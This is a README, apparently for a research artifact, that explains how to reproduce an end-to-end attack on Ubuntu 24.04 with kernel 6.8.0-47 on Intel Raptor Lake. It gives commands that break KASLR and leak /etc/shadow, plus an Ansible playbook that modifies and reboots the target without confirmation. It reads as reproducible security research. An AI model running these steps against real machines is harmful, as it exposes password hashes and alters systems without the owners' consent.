# End-to-End Attack

End-to-end attack against Ubuntu 24.04 kernel version 6.8.0-47-generic on an Intel Raptor Lake processor.


## Reproduce

The output is stored in [out](./out).

### Ansible

> [!WARNING]
> The ansible playbook modifies the target system without requesting confirmation to ensure default Linux mitigations are applied in GRUB kernel commandline. The target system will also be repeatedly rebooted between attack runs to ensure KASLR is re-randomized.

```bash
ansible-playbook run.yaml -e host=<hostname>
```

## Manual


Run the end-to-end attack
```bash
export experiment_core=2
export OUT_DIR=./out/manual/0/
mkdir -p "$OUT_DIR"

# build
make clean
make

# break KASLR
make run-kaslr CORE=$experiment_core | tee "$OUT_DIR/manual-kaslr.out"
# this will print KASLR offset: <kaslr_offset> with the value needed in the next steps

# leak /etc/shadow
make run-shadow KASLR_OFFSET=<kaslr_offset> CORE=$experiment_core | tee "$OUT_DIR/manual-shadow.out"
```

Benchmark the leak bandwidth.
```bash
# load the secret kernel module for benchmarking the leak bandwidth
make -C ../uarch-research-fw/kmod_secret/ install

make run-benchmark KASLR_OFFSET=<kaslr_offset> CORE=$experiment_core | tee "$OUT_DIR/manual-benchmark.out"
```


## Analyze

```bash
python3 analyze.py
```

The results are printed to the console.

### Expected Results

We expect the attack to work successfully in a high number of cases (>90%) with a leak rate of over 5KiB/s in the median.
